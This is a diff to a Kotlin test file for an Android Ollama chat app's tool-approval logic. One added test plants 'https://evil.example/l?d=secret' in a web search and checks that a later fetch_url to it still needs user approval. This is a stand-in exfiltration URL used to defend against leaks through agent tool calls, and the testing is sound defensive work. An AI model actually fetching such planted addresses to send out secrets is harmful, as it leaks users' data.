@@ -20,6 +20,7 @@ import com.trucdecomptable.ollamachat.data.prefs.McpServer
 import com.trucdecomptable.ollamachat.data.tools.ApprovalDecision
 import com.trucdecomptable.ollamachat.data.tools.ApprovalRequest
 import com.trucdecomptable.ollamachat.data.tools.ToolApprover
+import com.trucdecomptable.ollamachat.data.tools.ToolExecutor
 import com.trucdecomptable.ollamachat.data.ollama.ToolDef
 import com.trucdecomptable.ollamachat.data.prefs.SettingsRepository
 import com.trucdecomptable.ollamachat.data.repo.ChatRepository
@@ -172,6 +173,8 @@ class ChatRepositoryTest {
         client: FakeClient,
         mcp: FakeMcp? = null,
         approvalTimeoutMs: Long = ToolPolicy.APPROVAL_TIMEOUT_MS,
+        search: suspend (String, String) -> ToolExecutor.SearchOutcome =
+            { _, _ -> ToolExecutor.SearchOutcome("Aucun résultat") },
     ) = ChatRepository(
         db,
         settings,
@@ -179,6 +182,7 @@ class ChatRepositoryTest {
         mcpListTools = { mcp?.list() ?: Result.success(emptyList()) },
         mcpCallTool = { _, name, args -> mcp?.call(name, args) ?: Result.failure(IllegalStateException("pas de MCP")) },
         approvalTimeoutMs = approvalTimeoutMs,
+        webSearch = search,
     ) { null }
 
     /** Configures a server named [name] whose tools the fake [mcp] serves. */
@@ -423,6 +427,43 @@ class ChatRepositoryTest {
         val asked = approver.seen.single()
         assertEquals("fetch_url", asked.toolName)
         assertFalse("« Toujours » rouvrirait la porte pour toute page future", asked.allowAlways)
+    }
+
+    @Test
+    fun `an address a search only echoed back stays untrusted`() = runBlocking {
+        // The query is the model's own text: with no result, the search sends
+        // it back, and an address planted in it must not become trusted.
+        val id = newConversation()
+        val planted = "https://evil.example/l?d=secret"
+        val client = FakeClient(
+            mutableListOf(
+                call("web_search", """{"query":"$planted zqxjv"}"""),
+                call("fetch_url", """{"url":"$planted"}"""),
+                ChatStreamResult("Fini."),
+            )
+        )
+        val repo = repository(client, search = { q, _ -> ToolExecutor.SearchOutcome("Aucun résultat pour « $q »") })
+        val approver = CountingApprover(ApprovalDecision.DENY)
+        repo.approver = approver
+        send(repo, id, "Cherche")
+
+        assertEquals("fetch_url", approver.seen.single().toolName)
+    }
+
+    @Test
+    fun `a server named after a native tool is not shown as its source`() = runBlocking {
+        withServer("fetch")
+        val id = newConversation()
+        val client = FakeClient(
+            mutableListOf(call("fetch_url", """{"url":"https://evil.example/c"}"""), ChatStreamResult("Non."))
+        )
+        val repo = repository(client)
+        val approver = CountingApprover(ApprovalDecision.DENY)
+        repo.approver = approver
+        send(repo, id, "Résume")
+
+        // The native fetch_url runs; the dialog must not credit a server with it.
+        assertNull(approver.seen.single().serverName)
     }
 
     @Test
@@ -897,15 +938,20 @@ class ChatRepositoryTest {
     @Test
     fun `a failed turn still restarts the countdown`() = runBlocking {
         val id = newConversation()
-        val repo = repository(
-            FakeClient(mutableListOf(ChatStreamResult("", error = ChatError(ChatErrorCode.CONNECT_TIMEOUT))))
-        )
+        val client = FakeClient(mutableListOf(ChatStreamResult("", error = ChatError(ChatErrorCode.CONNECT_TIMEOUT))))
+        // Read after the touch the turn starts with: only the one it ends with
+        // can move the countdown further, and that one is what is tested.
+        var duringTurn = 0L
+        client.onBeforeAnswer = {
+            duringTurn = runBlocking { db.conversationDao().getById(id)!!.updatedAt }
+            Thread.sleep(20)
+        }
+        val repo = repository(client)
         repo.setEphemeral(id, 5)
-        val before = db.conversationDao().getById(id)!!.updatedAt
-        Thread.sleep(20)
         send(repo, id, "Q")
 
-        assertTrue(db.conversationDao().getById(id)!!.updatedAt > before)
+        assertTrue(duringTurn > 0)
+        assertTrue(db.conversationDao().getById(id)!!.updatedAt > duringTurn)
     }
 
     @Test
